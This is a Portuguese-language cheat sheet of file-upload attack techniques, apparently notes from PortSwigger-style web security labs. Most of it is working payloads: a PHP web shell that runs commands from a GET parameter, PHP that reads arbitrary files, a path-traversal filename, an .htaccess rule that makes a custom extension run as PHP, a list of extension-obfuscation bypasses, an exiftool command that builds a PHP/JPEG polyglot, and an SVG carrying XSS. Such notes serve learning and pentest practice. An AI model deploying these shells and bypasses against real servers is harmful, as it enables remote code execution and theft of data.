# Vulnerabilidades de Upload de Arquivo

Probabilidade: $${\color{yellow}média}$$.

<br>

Normalmente surge no upload de avatar em `/my-account`.

Arquivo malicioso para ler conteúdo:
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Arquivo malicioso com WebShell:
```
<?php echo system($_GET['command']); ?>

GET /example/exploit.php?command=id HTTP/1.1
```

<br>

## Laboratórios

**Web Shell Upload via Content-Type Restriction Bypass**

Upload malicious file and change Content-Type to `image/jpeg`.

<br>
<br

**Web Shell Upload via Path Traversal**

Explore Path Traversal para subir um arquivo para o diretório anterior:
```
filename="..%2fexploit.php"
```

E o acesse em: `GET /files/exploit.php?command=ls`.

<br>
<br>

**Web Shell Upload via Extension Blacklist Bypass**

A extensão `.php` está bloqueada, mas ainda é possível utilizar a extensão `.phar`.

Essa laboratório também ensina como você pode sobescrever o arquivo .htaccess com:
```
AddType application/x-httpd-php .l33t
```

Dessa maneira, ao subir uma extensão .l33t, o servidor interpretá como PHP.

<br>
<br>

**Web Shell Upload via Obfuscated File Extension**

Utilize um null byte para o bypass:
```
rce.php%00.jpg
```

Outros bypasses:
```
exploit.pHp
exploit.php.jpg
exploit.jpg.php
exploit.php.
exploit%2Ephp
exploit.p.phphp

exploit.asp;.jpg
exploit.asp%00.jpg
```

<br>
<br>

**Remote Code Execution via Polyglot Web Shell Upload**

Faça upload de um arquivo poliglota PHP/JPG que é uma imagem com código PHP em seus metadados.
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpeg -o polyglot.php
```

<br>

### Outros

**XSS SVG Upload**
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("XSS!");
   </script>
</svg>
```
